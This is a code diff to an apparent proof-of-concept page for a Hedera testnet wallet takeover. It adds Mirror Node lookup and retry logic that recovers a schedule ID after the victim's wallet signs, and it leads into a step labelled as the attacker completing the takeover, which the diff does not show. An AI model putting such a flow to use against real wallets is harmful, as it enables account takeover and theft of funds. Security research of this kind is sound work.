@@ -90,6 +90,44 @@ button:disabled { opacity: .45; }
         return res.json();
     }
 
+    function toMirrorTxId(sdkTxIdString) {
+        // SDK format: "0.0.xxxxx@seconds.nanos"
+        // Mirror REST format: "0.0.xxxxx-seconds-nanos"
+        const atIndex = sdkTxIdString.indexOf("@");
+        const accountPart = sdkTxIdString.slice(0, atIndex);
+        const timePart = sdkTxIdString.slice(atIndex + 1).replace(".", "-");
+        return accountPart + "-" + timePart;
+    }
+
+    async function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function getScheduleIdFromMirror(sdkTxIdString) {
+        const mirrorTxId = toMirrorTxId(sdkTxIdString);
+        const url = "https://testnet.mirrornode.hedera.com/api/v1/transactions/" + mirrorTxId;
+
+        for (let attempt = 1; attempt <= 6; attempt++) {
+            log("Mirror Node lookup attempt " + attempt + "/6 for " + mirrorTxId + "...", "info");
+            try {
+                const res = await fetch(url);
+                if (res.ok) {
+                    const data = await res.json();
+                    const tx = data.transactions && data.transactions[0];
+                    if (tx && tx.entity_id) {
+                        log("Found schedule ID via Mirror Node: " + tx.entity_id, "ok");
+                        return tx.entity_id;
+                    }
+                }
+            } catch (e) {
+                log("Lookup attempt failed: " + e.message, "warn");
+            }
+            await sleep(2500);
+        }
+
+        return null;
+    }
+
     runBtn.onclick = async function () {
 
         runBtn.disabled = true;
@@ -156,24 +194,29 @@ button:disabled { opacity: .45; }
             const signResult = await bridge.signTransaction(b64);
             log("Wallet approved. Response: " + s(signResult), "ok");
 
-            let scheduleId = signResult && (signResult.scheduleId ||
-                (signResult.receipt && signResult.receipt.scheduleId));
+            let scheduleId = signResult && signResult.scheduleId
+                ? signResult.scheduleId
+                : (signResult && signResult.receipt && signResult.receipt.scheduleId);
 
             if (!scheduleId) {
-                log("No schedule ID in wallet response - looking it up via Mirror Node...", "warn");
-                const txLookup = await fetch(
-                    "https://testnet.mirrornode.hedera.com/api/v1/transactions/" +
-                    scheduleTx.transactionId.toString().replace("@", "-").replace(/\./g, "-")
-                ).then(r => r.json()).catch(() => null);
-                log(
-                    "Automatic lookup " + (txLookup ? "attempted, check log" : "failed") +
-                    " - if step 5 below fails, get the schedule ID manually from " +
-                    "Mirror Node and re-run with it hardcoded.",
-                    "warn"
-                );
-            } else {
-                log("Schedule ID: " + scheduleId, "ok");
+                // Wallet returned a bare transaction ID string (or an
+                // object without scheduleId) - look it up on Mirror
+                // Node using the transaction ID we generated ourselves.
+                const sdkTxIdString = scheduleTx.transactionId.toString();
+                log("No schedule ID in wallet response - resolving via Mirror Node...", "warn");
+                scheduleId = await getScheduleIdFromMirror(sdkTxIdString);
             }
+
+            if (!scheduleId) {
+                throw new Error(
+                    "Could not resolve schedule ID after retries - " +
+                    "the ScheduleCreate may not have reached consensus " +
+                    "yet, or the wallet submitted it differently than " +
+                    "expected. Try again in a few seconds."
+                );
+            }
+
+            log("Using schedule ID: " + scheduleId, "ok");
 
             /* ---- 5. Complete the takeover automatically (attacker's half) ---- */
 
